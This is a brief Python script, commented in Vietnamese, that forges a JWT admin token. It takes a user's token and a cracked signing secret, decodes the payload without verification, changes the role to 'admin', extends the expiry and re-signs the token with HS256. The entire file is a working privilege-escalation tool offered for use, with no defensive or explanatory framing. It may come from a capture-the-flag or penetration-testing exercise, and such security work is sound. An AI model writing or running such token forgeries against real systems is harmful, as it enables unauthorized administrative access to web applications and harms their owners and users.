import jwt
import time

print("=== JWT ADMIN TOKEN FORGE (PRO VERSION) ===")

# 1. Nhập Token gốc và Secret tìm được
original_token = input("Paste ORIGINAL user token: ").strip()
secret = input("Enter discovered JWT secret: ").strip()

try:
    # 2. Decode lấy dữ liệu cũ (không cần verify vì ta đã có secret)
    decoded_payload = jwt.decode(original_token, options={"verify_signature": False})
    
    print("\n[!] Original Payload:", decoded_payload)

    # 3. Chỉnh sửa quyền hạn
    decoded_payload['role'] = 'admin'
    
    # Cập nhật thời gian hết hạn mới (nếu muốn)
    decoded_payload['exp'] = int(time.time()) + 3600 

    # 4. Ký lại với Secret đã bẻ khóa được
    forged_token = jwt.encode(decoded_payload, secret, algorithm="HS256")

    print("\n" + "="*30)
    print("SUCCESS: Admin token forged!")
    print("="*30)
    print(forged_token)
    print("="*30)

except Exception as e:
    print(f"Error: {e}")